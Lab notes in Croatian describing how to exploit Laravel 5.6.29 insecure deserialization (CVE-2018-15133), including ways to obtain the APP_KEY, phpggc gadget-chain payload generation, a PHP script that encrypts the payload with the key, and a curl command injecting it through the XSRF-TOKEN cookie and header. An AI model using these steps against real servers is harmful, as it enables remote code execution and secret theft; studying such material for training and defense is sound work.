Insecure deserialization je problem kada backend aplikacija ne sterilizira input korisnika kada joj šalje neki tekst ili datoteke.

Automatizacija se vrši preko "php phpggc -l" tako da potrazimo ima severa/ verziju koju zelimo napasti.
U slucaju laboratorija koji sam obrađivao stranica je koristila Laravel 5.6.29
Za taj slucaj koristili smo 2018-15133 za koji nam je bio potreban APP-KEY.
APP-KEY mozemo dobiti na nekoliko nacina:
    - potraziti env datoteke preko file traversala
    - neke verzije laravela izbace key kada se dogodi greske, pa mozemo pokusati poslati nepravilan request (curl -X GET "http://10.10.10.10/nonexistent-route?debug=true" -v)
    - starije verzije kod debug outputa leakaju .env datoteku (CVE-2017-16894)
    - pretrazivanje preko putanja sa ffuzerom ili gobusterom (/debug,/info,/get-key,...)
    - ako nista od navedenoga ne radi mozemo brute forcati key (python3 laravel-crypto-killer.py bruteforce -v "COOKIE_VALUE" -kf /path/to/common_appkeys.txt)

Exploitment sa primjera sa vrsio na ovaj nacin:
    - pronasli smo verziju servera i preko phpgcc ispisali moguce exploitove (php phpggc -l Laravel)
    - generirali smo payload sa željenom naredbom (phpggc Laravel/RCE1 whoami) i dobili smo natrag PHP string (O:45:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"events";O:25:"Illuminate\Bus\Dispatcher":1:{s:10:"queueResolver";a:2:{i:0;O:25:"Illuminate\Events\Dispatcher":0:{} i:1;s:6:"dispatch";}}s:8:"payload";s:6:"whoami";})
    - koristeci php skriptu koja enkriptira payload i potpise ga sa APP-KEY
<?php
require 'vendor/autoload.php'; // Laravel encryptor (install via composer)
use Illuminate\Encryption\Encrypter;

// APP_KEY
$appKey = base64_decode(substr('base64:YourKeyHere==', 7));
$payload = 'O:45:"Illuminate\Broadcasting\PendingBroadcast":2:{...}'; // Paste PHPGGC output
$encrypter = new Encrypter($appKey, 'AES-256-CBC');
$encrypted = $encrypter->encrypt($payload);
echo $encrypted . "\n";
?>
    - Moramo pronaci vektor koji cemo napasti (oni su cesto cookie XSRF-TOKEN i laravel_session, te headeri X-XSRF-TOKEN)
    - Pisemo curl naredbu preko koje cemo pokusati doci do podataka koje zelimo izvaditi sa 
    curl -X GET "http://MACHINE_IP/" -H "Cookie: XSRF-TOKEN=$(cat encrypted_payload.txt)" -H "X-XSRF-TOKEN: $(cat encrypted_payload.txt)"